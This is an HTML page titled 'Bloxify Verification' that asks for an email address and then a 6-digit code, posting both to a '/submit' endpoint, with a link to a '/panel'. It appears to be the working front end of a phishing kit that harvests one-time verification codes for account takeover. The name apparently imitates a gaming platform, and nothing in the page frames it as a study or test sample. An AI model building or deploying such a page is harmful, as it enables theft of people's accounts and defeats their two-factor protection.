<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Bloxify Verification</title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%; height: 100%;
    background: black;
    font-family: Arial;
    overflow: hidden;
    color: #eee;
}

/* Floating starfield */
#space {
    position: fixed;
    width: 200%;
    height: 200%;
    background: radial-gradient(white 1px, transparent 1px);
    background-size: 100px 100px;
    animation: drift 120s linear infinite;
}

@keyframes drift {
    0% { transform: translate(0,0); }
    100% { transform: translate(-400px,-400px); }
}

/* UI Box */
#box {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 400px;
    padding: 35px;
    background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
    border-radius: 16px;
    text-align: center;
    box-shadow: 0 0 25px rgba(255,255,255,0.15);
    z-index: 10;
}

/* Inputs */
input, button {
    width: 100%;
    padding: 12px;
    margin-top: 12px;
    border-radius: 8px;
    border: none;
    font-size: 16px;
}

input { background: #222; color: white; }
button { background: #333; color: white; cursor: pointer; }
button:hover { background: #444; }

#codeBox { display: none; }
#error { color: #ff6b6b; display: none; }

a { color: #777; text-decoration: none; }
</style>
</head>
<body>

<div id="space"></div>

<div id="box">
    <h1>Bloxify Verification</h1>
    <input id="email" placeholder="Email">
    <button onclick="sendEmail()">Submit</button>

    <div id="codeBox">
        <input id="code" maxlength="6" placeholder="6-digit code" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
        <button onclick="sendCode()">Verify</button>
        <p id="error">Verification failed, try again</p>
    </div>

    <br>
    <a href="/panel">Panel</a>
</div>

<script>
// Extra small stars for floating background
const starCount = 200;
for (let i = 0; i < starCount; i++) {
    const s = document.createElement("div");
    s.className = "star";
    s.style.width = `${Math.random() * 2 + 1}px`;
    s.style.height = s.style.width;
    s.style.position = "absolute";
    s.style.background = "white";
    s.style.borderRadius = "50%";
    s.style.left = `${Math.random() * window.innerWidth}px`;
    s.style.top = `${Math.random() * window.innerHeight}px`;
    s.style.opacity = Math.random();
    s.style.boxShadow = "0 0 2px white";
    document.body.appendChild(s);

    // Animate each star slowly in a drift pattern
    const speed = Math.random() * 0.2 + 0.05;
    function animateStar() {
        let x = parseFloat(s.style.left) - speed;
        let y = parseFloat(s.style.top);
        if (x < 0) x = window.innerWidth;
        s.style.left = x + "px";
        s.style.top = y + "px";
        requestAnimationFrame(animateStar);
    }
    animateStar();
}

// Submit email
function sendEmail() {
    fetch("/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ email: email.value })
    });
    document.getElementById("codeBox").style.display = "block";
}

// Submit code
function sendCode() {
    fetch("/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ email: email.value, code: code.value })
    }).then(r => {
        if (!r.ok) document.getElementById("error").style.display = "block";
        else alert("Verification complete");
    });
}
</script>
</body>
</html>
